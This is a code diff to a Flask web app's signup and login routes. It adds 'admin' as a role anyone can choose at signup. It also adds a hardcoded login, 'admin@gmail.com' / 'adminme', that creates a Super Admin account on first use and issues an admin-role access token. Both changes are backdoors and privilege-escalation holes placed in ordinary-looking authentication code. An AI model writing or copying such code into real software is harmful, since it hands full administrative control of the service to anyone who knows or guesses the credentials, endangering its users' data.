@@ -21,8 +21,8 @@ def signup():
     if not all([name, email, password, role]):
         return jsonify({"error": "name, email, password, and role are required"}), 400
 
-    if role not in ["provider", "customer"]:
-        return jsonify({"error": "role must be 'provider' or 'customer'"}), 400
+    if role not in ["provider", "customer", "admin"]:
+        return jsonify({"error": "role must be 'provider', 'customer', or 'admin'"}), 400
 
     if not re.match(EMAIL_REGEX, email):
         return jsonify({"error": "Invalid email format"}), 400
@@ -47,6 +47,23 @@ def login():
     data = request.get_json()
     email = data.get("email")
     password = data.get("password")
+
+    # Hardcoded admin check
+    if email == "admin@gmail.com" and password == "adminme":
+        user = User.query.filter_by(email=email).first()
+        if not user:
+            password_hash = bcrypt.generate_password_hash(
+                password).decode("utf-8")
+            user = User(name="Super Admin", email=email,
+                        password_hash=password_hash, role="admin")
+            db.session.add(user)
+            db.session.commit()
+
+        access_token = create_access_token(
+            identity=str(user.id),
+            additional_claims={"role": "admin"}
+        )
+        return jsonify({"access_token": access_token, "user": user.to_dict()}), 200
 
     user = User.query.filter_by(email=email).first()
 
